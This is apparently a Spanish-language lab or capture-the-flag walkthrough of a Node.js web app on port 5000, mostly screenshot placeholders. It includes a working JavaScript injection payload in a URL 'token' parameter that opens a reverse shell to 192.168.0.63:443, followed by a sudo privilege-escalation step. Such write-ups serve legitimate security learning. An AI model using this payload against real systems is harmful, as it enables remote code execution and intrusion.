Hacemos el escaneo con nmap:
![[Pasted image 20231002101011.png]]
Y esto es lo que corre por el puerto 5000:
![[Pasted image 20231002101152.png]]
Y si ponemos un texto en ese cuadro y damos a enter vemos que lo imprime por pantalla:
![[Pasted image 20231002101235.png]]
Pero vemos que nos cambia la url cada vez que añadimos algún parámetro:
![[Pasted image 20231002101402.png]]
Probamos en cambiar los parámetros de la url y la web crashea:
![[Pasted image 20231002101603.png]]
Y en esta web tenemos unas instrucciones de un payload que podemos utilizar para entablar una reverse shell:
https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73
![[Pasted image 20231002105041.png]]

```bash
192.168.0.24:5000/?name=mario&token=(function(){ var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect(443, '192.168.0.63', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
```
Si esto lo ponemos en el apartado de token, vemos que funciona:
![[Pasted image 20231002105150.png]]
![[Pasted image 20231002105158.png]]
Si ejecutamos un sudo -l vemos que podemos ejecutar un binario llamado links:
![[Pasted image 20231002105434.png]]
Y esto es lo que hace:
![[Pasted image 20231002105816.png]]
![[Pasted image 20231002105518.png]]

![[Pasted image 20231002105905.png]]

![[Pasted image 20231002105919.png]]
